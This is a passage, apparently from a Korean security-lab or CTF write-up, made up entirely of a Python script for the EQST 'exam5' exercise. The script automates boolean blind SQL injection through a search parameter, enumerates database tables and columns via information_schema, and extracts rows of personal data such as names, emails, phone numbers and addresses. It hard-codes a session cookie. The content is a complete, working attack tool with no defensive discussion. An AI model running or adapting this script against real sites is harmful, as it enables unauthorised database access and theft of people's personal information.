### 3.1. 소스코드

```python
"""EQST exam5: 스키마 탐색 후 개인정보 추출."""

import time
import requests

URL = "https://lab.eqst.co.kr:8083/exam5/noticelist.php"
PHPSESSID = "5c0a12cdc8949ec2d79434420d4aed8d"
TRUE_MARKER = "noticeview.php?board_id="
TABLE_HINTS = ("member", "user", "account", "customer", "student")
FIELD_HINTS = (
    "acct_id", "login_id", "user_nm", "name", "email", "phone", "mobile",
    "zipcode", "address", "addr", "birth", "gender",
)
PARAMS = {
    "pageIndex": "1", "sorting": "BOARD_ID", "sortingAd": "DESC",
    "startDt": "", "endDt": "", "searchType": "all",
}

session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
request_count = 0


def oracle(condition):
    """조건이 참이면 검색 결과에 게시글 링크가 나타난다."""
    global request_count
    params = dict(PARAMS)
    params["keyword"] = f"AAA' AND ({condition}) AND '%'='"
    for attempt in range(5):
        try:
            response = session.get(URL, params=params, timeout=25)
            response.raise_for_status()
            request_count += 1
            return TRUE_MARKER in response.text
        except (requests.Timeout, requests.ConnectionError):
            if attempt == 4:
                raise
            time.sleep((attempt + 1) * 2)


def number(expression, upper):
    """SQL 정숫값을 이진 탐색한다."""
    low = 0
    while low < upper:
        middle = (low + upper) // 2
        if oracle(f"({expression})>{middle}"):
            low = middle + 1
        else:
            upper = middle
    return low


def extract(expression):
    """SQL 문자열을 HEX로 변환해 UTF-8 값으로 복원한다."""
    hex_sql = f"HEX(CAST(COALESCE(({expression}),'') AS BINARY))"
    length = number(f"LENGTH({hex_sql})", 1024)
    result = ""
    for position in range(1, length + 1):
        code = number(f"ASCII(SUBSTRING({hex_sql},{position},1))", 127)
        result += chr(code)
    return bytes.fromhex(result).decode("utf-8", errors="replace")


def tables():
    count = number(
        "SELECT COUNT(*) FROM information_schema.tables "
        "WHERE table_schema=DATABASE()", 100
    )
    result = []
    for index in range(count):
        table = extract(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=DATABASE() ORDER BY table_name "
            f"LIMIT {index},1"
        )
        result.append(table)
        print(f"  {index + 1:02d}. {table}")
    return result


def columns(table):
    safe_table = "'" + table.replace("'", "''") + "'"
    count = number(
        "SELECT COUNT(*) FROM information_schema.columns "
        f"WHERE table_schema=DATABASE() AND table_name={safe_table}", 100
    )
    result = []
    for index in range(count):
        column = extract(
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_schema=DATABASE() "
            f"AND table_name={safe_table} ORDER BY ordinal_position "
            f"LIMIT {index},1"
        )
        result.append(column)
    return result


def find_target(all_tables):
    ordered = sorted(
        all_tables,
        key=lambda table: not any(hint in table.lower() for hint in TABLE_HINTS),
    )
    for table in ordered:
        print(f"[+] 컬럼 확인: {table}")
        all_columns = columns(table)
        print("    " + ", ".join(all_columns))
        fields = [
            column for column in all_columns
            if any(hint in column.lower() for hint in FIELD_HINTS)
        ]
        if len(fields) >= 2:
            return table, all_columns, fields
    return None


def main():
    print("=" * 55)
    print(" MySQL Blind SQL Injection 자동화")
    print("=" * 55)

    if not oracle("1=1") or oracle("1=2"):
        raise SystemExit("[-] 세션이 만료됐거나 참/거짓 판별에 실패했습니다.")

    print("\n[+] 테이블 목록")
    all_tables = tables()
    target = find_target(all_tables)
    if not target:
        raise SystemExit("[-] 개인정보 테이블을 찾지 못했습니다.")

    table, all_columns, fields = target
    table_id = "`" + table.replace("`", "``") + "`"

    print(f"\n[+] 선택 테이블: {table}")
    print(f"[+] 추출 컬럼: {', '.join(fields)}")
    if not oracle(f"EXISTS(SELECT 1 FROM {table_id} LIMIT 1)"):
        raise SystemExit("[-] 추출할 사용자 데이터가 없습니다.")

    rows = []
    for row_index in range(2):
        if not oracle(
            f"EXISTS(SELECT 1 FROM {table_id} LIMIT {row_index},1)"
        ):
            break
        print(f"\n[+] 행 {row_index + 1}")
        values = {}
        for index, field in enumerate(fields, 1):
            print(f"[{index}/{len(fields)}] {field}: ", end="", flush=True)
            values[field] = extract(
                f"SELECT CAST(`{field}` AS CHAR) FROM {table_id} "
                f"LIMIT {row_index},1"
            )
            print(values[field])
        rows.append(values)

    print("-" * 55)
    print(",".join(fields))
    for values in rows:
        print(",".join(values[field] for field in fields))
    print(f"완료 | HTTP 요청 {request_count}회")


if __name__ == "__main__":
    main()


```
